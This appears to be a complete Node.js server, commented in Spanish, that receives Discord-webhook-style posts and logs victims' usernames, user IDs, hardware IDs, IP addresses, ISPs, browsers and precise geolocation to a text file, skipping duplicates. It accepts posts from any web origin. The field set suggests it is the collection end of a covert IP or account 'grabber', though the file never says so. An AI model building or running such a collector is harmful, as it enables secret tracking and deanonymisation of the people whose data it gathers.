const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    if (req.method === 'POST') {
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const timestamp = new Date().toISOString();
                
                let info = {};

                if (data.embeds && data.embeds[0] && data.embeds[0].fields) {
                    data.embeds[0].fields.forEach(field => {
                        info[field.name] = field.value;
                    });
                }

                const currentIP = info["IP Address"] || 'N/A';
                const currentUsername = info["Username"] || 'N/A';

                // Verificamos si ya existe el archivo logs.txt para leer su contenido
                fs.readFile('logs.txt', 'utf8', (err, fileContent) => {
                    let isDuplicate = false;

                    if (!err && fileContent) {
                        // Buscamos si ya hay un registro con exactamente la misma IP y el mismo Usuario
                        const lines = fileContent.split('\n');
                        let lastIpFound = '';
                        let lastUserFound = '';

                        for (let line of lines) {
                            if (line.includes('IP Address:')) {
                                lastIpFound = line.split('IP Address:')[1].trim();
                            }
                            if (line.startsWith('Username:')) {
                                lastUserFound = line.split('Username:')[1].trim();
                            }

                            // Si encontramos coincidencia de ambos, marcamos como duplicado
                            if (lastIpFound === currentIP && lastUserFound === currentUsername) {
                                isDuplicate = true;
                                break;
                            }
                        }
                    }

                    if (isDuplicate) {
                        console.log(`Registro ignorado: Manda la misma IP (${currentIP}) y el mismo usuario (${currentUsername}).`);
                        res.writeHead(200, { 'Content-Type': 'application/json' });
                        res.end(JSON.stringify({ status: "ignored", message: "Ya registrado anteriormente" }));
                        return;
                    }

                    // Si no es duplicado (es una IP nueva o un usuario diferente con la misma IP), lo guardamos
                    const logEntry = 
                        `${info["Username"] || 'Desconocido'}\n` +
                        `Join ID: ${info["User ID"] || 'N/A'}\n\n` +
                        `User Info\n` +
                        `Username: ${info["Username"] || 'N/A'}\n` +
                        `User ID: ${info["User ID"] || 'N/A'}\n\n` +
                        `HWID:\n${info["HWID"] || 'N/A'}\n\n` +
                        `Ubicación:\n` +
                        `País: ${info["Country"] || 'N/A'} (Región: ${info["Region"] || 'N/A'}, Ciudad: ${info["City"] || 'N/A'})\n` +
                        `Lat, Long: ${info["Lat, Long"] || 'N/A'}\n` +
                        `ISP: ${info["ISP"] || 'N/A'}\n` +
                        `IP Address: ${currentIP}\n\n` +
                        `Detalles Técnicos:\n` +
                        `Navegador / Dispositivo: ${info["Browser"] || 'N/A'}\n` +
                        `Locale: ${info["Locale"] || 'N/A'} | Status: ${info["Status"] || 'N/A'}\n` +
                        `Fecha de Registro: ${timestamp}\n` +
                        `-----------------------------------------\n\n`;

                    fs.appendFile('logs.txt', logEntry, writeErr => {
                        if (writeErr) console.error("Error al guardar en el archivo:", writeErr);
                    });

                    console.log("Nuevo registro único guardado con éxito.");
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ status: "success", message: "Guardado correctamente" }));
                });

            } catch (e) {
                console.error("Error al procesar JSON:", e);
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: "error", message: "JSON inválido" }));
            }
        });
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end("Ruta no encontrada");
    }
});

const PORT = process.env.PORT || 26237;
server.listen(PORT, () => {
    console.log(`Servidor activo en el puerto ${PORT}`);
});
